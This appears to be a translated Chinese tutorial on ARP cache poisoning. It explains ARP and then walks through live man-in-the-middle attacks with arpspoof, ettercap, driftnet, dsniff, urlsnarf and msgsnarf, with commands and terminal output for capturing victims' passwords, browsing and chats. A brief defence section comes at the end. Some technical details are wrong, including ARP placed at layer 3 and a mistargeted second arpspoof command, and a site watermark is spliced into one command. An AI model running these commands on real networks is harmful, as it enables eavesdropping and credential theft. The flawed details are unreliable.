@@ -1,0 +1,161 @@
+===中间人攻击-ARP毒化===
+  中间人攻击虽然古老，但仍处于受到黑客攻击的危险中，可能会严重导致危害服务器和用户。
+  仍然有很多变种的中间人攻击是有效的，它们能够很容易的欺骗外行并且入侵他们。
+  正如字面意思一样，中间人攻击就是攻击者扮演中间人并且实施攻击。
+  它有时被称为monkey-in-the-middle攻击，更先进的说它是man-in-the-browser攻击和man-in-the-mobile攻击。
+  这其实是一个危险的攻击，它可以劫持一段会话，我们叫它会话劫持。它可以窃取凭证和其他机密信息，即使使用了SSL加密。
+
+====ARP（地址解析协议）====
+ ARP是一项协议。负责执行多个工作并且提供正确的数据包，在中间人攻击中，ARP扮演着重要的角色。那么，什么是ARP缓存中毒攻击呢？
+ 要充分了解攻击，你需要了解ARP的概念，ARP协议通过IP地址来查找主机的物理地址（也就是MAC地址）。（PS：在以太网中，是用MAC地址来进行通讯的。）
+ 让我们来想象这样一个场景：在一个以太网交换网络内，主机A希望能与主机B进行交流（所以我们要获取他的MAC地址咯）。所以主机A通过交换机（HUB也可以- -）对整个网络进行广播，然后使用地址解析协议找到目标主机B的MAC地址。尽管整个广播域下都能收到主机A发送的信息，但只有主机A所请求的主机才会回复ARP请求，将自己的MAC地址发给主机A。
+
+ 主机A发送的所包含的信息：
+ 	源IP: 192.168.1.2
+ 	源MAC: 00:1c:23:42:8d:f4
+ 	目的IP: 192.168.1.12
+ 	目的MAC地址: 00:00:00:00:00:00 <PS:不知道作者为啥写全0,应该也是本地广播吧。不清楚的同学就当全F吧。
+
+ 之后B主机回复ARP请求
+ 	源IP: 192.168.1.12
+ 	源MAC: 2f:8d:1c:0f:f2:8f
+ 	目的IP: 192.168.1.2
+ 	目的MAC地址: 00:1c:23:42:8d:f4
+ 	ARP请求：
+
+ 考虑上述场景，主机A的ARP请求发送一个广播给所有同网络的主机。
+ 	ARP响应：
+ 		它回复了响应，其中包含目的主机的MAC地址（主机B也在此网段内）。
+ 	RARP请求：
+ 		RARP（反向地址解析协议）与ARP相反，RARP请求就是根据MAC地址来查找IP地址。
+ 	RARP响应：
+ 		RARP响应与ARP响应相反，在RARP响应中它包含了IP地址。
+
+ ARP工作在OSI模型的第三层（网络层），但它不局限于此。它可以请求第二层（数据链路层）获取物理地址（MAC）。当然与它相反的过程就是RARP
+ 所有的主机维护他们自己的ARP缓存表，所以不会每一次都发送广播，ARP表中包含IP对应的MAC地址。
+
+====ARP欺骗（ARP毒化）====
+ ARP毒化也被称为ARP缓存中毒和ARP欺骗攻击，这是在内网的中间人攻击。
+ ARP欺骗采取的优势是通过ARP协议欺骗，达到对整个网络进行欺骗。
+ 有几种可能引起ARP欺骗的方法，一般是利用内网中的被攻陷主机或使用自己的主机（内部入侵）。
+ 有许多工具能够来实施ARP欺骗，如：
+ 	ARPspoof
+ 	Cain&abel
+ 	Ettercap
+ 	ARPoison
+ 	Dsniff
+ 	Parasite
+
+====让我们开始实战吧====
+ root@bt:~# arp
+ Address HWtype HWaddress Flags Mask Iface
+ 192.168.1.1 ether 00:22:93:cf:eb:6d C eth0
+ 所以我的ARP表已经有了默认的网关和MAC地址，我将演示把所有受害者的流量引入我的主机（攻击者），然后我使用ARP欺骗，而网关将把原本流入他们的数据传送给我。
+
+ 攻击者：192.168.1.2
+ 被欺骗主机：192.168.1.5
+ 默认网关：192.168.1.1
+
+ 我们需要启用IP转发，做到对于被攻击者透明，输入下面命令（PS:利用Linux主机的路由功能）：
+ root@bt:~# cat /proc/sys/net/ipv4/ip_forward
+ 0
+ root@bt:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
+ root@bt:~# cat /proc/sys/net/ipv4/ip_forward
+ 1
+
+*使用ARPspoof，来演示ARPspoofing攻击
+ 这是一个不错的开源工具，可以用来执行ARP欺骗攻击。
+ root@bt:~# arpspoof -h
+ Usage: arpspoof [-i interface] [-t target] host
+ 利用ARP毒化，重定向受害者的流量传送给攻击者。
+ root@bt:~# arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
+
+ 第二个ARP毒化攻击，使网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）
+ root@bt:~# arpspoof -i eth0 -t 192.168.1.1  192.168.1.2
+
+ 让我们来捕获数据包。我在受攻击的主机上用google搜索猫的图片。
+ 现在我们在攻击者的主机上输入：
+ root@bt:~# driftnet -i eth0
+
+*通过使用Ettercap来进行ARP欺骗
+ Ettercap是一个多用途的开源工具，可以用来执行嗅探、主机分析等。
+ 在本教程中，我们使用中间人攻击进行ARP欺骗，ettercap有些不错的插件，可以增强中间人攻击。Ettercap中最重要的插件如下:
+ 	dns_spoof (执行DNS欺骗攻击)
+ 	Dos_attack(对受害主机进行拒绝服务攻击)
+ 	Chk_poison(检测是否成功进行了攻击)
+ 	Repoison_arp(顾名思义，修复ARP)
+ 当然ettercap还有很多插件可以使用，ettercap的优点在于可以使用图形化界面和命令行模式，GUI的ettercap非常容易使用。
+
+ 在实际攻击之前，让我们先来讨论一些参数
+ 	-t 只监听这种协议
+ 	-T ettercap检查pcap文件（脱机监听）
+ 	-q 安静（不回显）
+ 	-M 这是一个重要的参数，他会告诉ettercap执行中间人攻击，使用这个参数很简单，如-M method
+
+ Ettercap -T -q -M ARP//
+ 如果你在一个非常大的网络，那么我不建议你用这个命令。因为命令告诉ettercap对所有主机进行ARP欺骗
+
+ 目标/受害者IP：192.168.1.6
+ root@bt:~# ettercap -T -q -M ARP /192.168.1.6/ //
+ ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGAListening on eth0... (Ethernet)
+ eth0 ->    00:1C:23:42:8D:04 192.168.1.4 255.255.255.0SSL dissection needs a valid 'redir_command_on' script in the etter.conf filePrivileges dropped to UID 65534 GID 65534...28 plugins39 protocol dissectors53 ports monitored7587 mac vendor fingerprint1698 tcp OS fingerprint
+ 2183 known servicesRandomizing 255 hosts for scanning...Scanning the whole netmask for 255 hosts...* |==================================================>| 100.00 %
+ …..............Starting Unified sniffing...
+ 这意味着一切准备工作完成了，嗅探已经启动，让我们验证它吧。
+ root@bt:~# driftnet -i eth0
+
+*分析ARP毒化，手动验证IP地址，
+ 受害主机被攻击之前：
+ C:\>arp -a
+ No ARP Entries Found
+
+ 受害主机被攻击之后：
+ C:\>arp -a www.2cto.com
+ Interface: 192.168.1.6 --- 0x2Internet Address     Physical Address     Type192.168.1.1        00-1c-23-42-8d-04     dynamic192.168.1.4         00-1c-23-42-8d-04     dynamic
+ 你可以看到，都是常见的主机IP和路由IP，而MAC地址则是攻击者的物理地址，因此ARP欺骗已经成功。
+
+ 攻击者主机在攻击之前：
+ root@bt:~# arpAddress HWtype HWaddress Flags Mask Iface192.168.1.1 ether 00:22:93:cf:eb:6d C eth0
+
+ 攻击者主机在攻击之后：
+ root@bt:~# arp
+ Address HWtype HWaddress Flags Mask Iface
+ 192.168.1.6 ether 08:00:27:66:13:9b C eth0
+ 192.168.1.1 ether 00:22:93:cf:eb:6d C eth0
+
+ 有很多其他方式来展现ARP欺骗的力量，我们将讨论dsniff套件中的一部分。
+ Dsniff&ARP欺骗攻击
+ Dsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如：
+ 	Msgsnarf
+ 	Urlsnarf
+ 	Mailsnarf
+ 	Filesnarf
+ 	dnsspoof
+ 在如下攻击场景中：
+ 	攻击者IP：192.168.1.12
+ 	被攻击主机IP:192.168.1.6
+ 	路由(网关)IP：192.168.1.1
+
+ 让我们开始进行ARPspoof IP转发攻击：
+ root@bt:~# echo 1 >> /proc/sys/net/ipv4/ip_forward
+ root@bt:~# arpspoof -i eth0 -t 192.168.1.6 192.168.1.1
+ root@bt:~# arpspoof -i eth0 -t 192.168.1.1 192.168.1.12
+
+ 我刚刚启用端口转发，之后使用arpspoof（dsniff的一个插件）来执行ARP毒化攻击。开启dsniff来捕获已知协议获取密码。
+ root@bt:~# dsniff -i eth0dsniff: listening on eth0
+
+ 因为攻击者的主机作为了默认的路由器（因为进行了ARP欺骗），因此受害主机传输的数据经过攻击者，攻击者很容易可以嗅探到受害者发送的信息。我们可以arpspoof所有网段内的主机，但我们的示例中只ARP欺骗了单个主机。你可以试试其他的dsniif工具，像urlsnarf。
+ root@bt:~# urlsnarf -i eth0
+ urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
+ 它能捕获受害者访问网站的详细信息。你可以试试msgsnarf捕获即时聊天会话信息，我的意思是如果用户通过雅虎聊天或者任何IRC频道，通过msgsnarf可以捕获受害者所有的谈话
+
+ 结束攻击需要结束arpspoof。
+ root@bt:~# killall arpspoof
+
+====如何防止ARP毒化攻击====
+ ARP欺骗是一种非常危险的攻击，攻击者可以很容易的探取受害者主机证书和其他机密信息。因此如何发现且保护ARP毒化受害者攻击呢？其实这是很容易识别的，如果你是受害主机，可以使用ARP命令查看。
+ 正如我们可以对上面所讨论IP地址被ARP欺骗攻击之前和之后的区别进行比较，能够验证你是否是受害者。其他的方法是设置ARP缓存表为静态，但不推荐。因为在一个大型的网络中，它要花费很长的时间手动设置，这是不可能的。
+ 这里有很多工具可以用来帮助你判断是否受到了ARP欺骗，而且有几种工具是可用的，它可以保护你的计算机免受ARP毒化并且检测出ARP缓存表的更变，一些比较出名的工具：
+ 	ARPon
+ 	ARP Wath
+ 	XARP
